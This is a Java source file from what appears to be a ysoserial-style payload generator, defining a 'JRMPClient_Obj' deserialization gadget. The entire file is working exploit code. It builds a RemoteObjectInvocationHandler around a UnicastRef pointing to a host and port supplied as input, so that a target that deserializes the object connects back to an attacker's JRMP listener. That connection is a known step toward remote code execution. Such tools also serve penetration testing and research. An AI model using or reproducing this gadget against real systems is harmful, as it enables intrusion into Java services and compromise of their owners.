package com.h2tg.ysogate.payloads.gadgets;

import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


@Authors({"mbechler"})
public class JRMPClient_Obj implements CommandObjectPayload<RemoteObjectInvocationHandler>
{

	public RemoteObjectInvocationHandler getObject(String command) throws Exception {
		String host;
		int    port, sep = command.indexOf(':');
		if (sep < 0) {
			port = (new Random()).nextInt(65535);
			host = command;
		} else {
			host = command.substring(0, sep);
			port = Integer.valueOf(command.substring(sep + 1)).intValue();
		}
		ObjID                         id  = new ObjID((new Random()).nextInt());
		TCPEndpoint                   te  = new TCPEndpoint(host, port);
		UnicastRef                    ref = new UnicastRef(new LiveRef(id, te, false));
		RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
		return obj;
	}
}
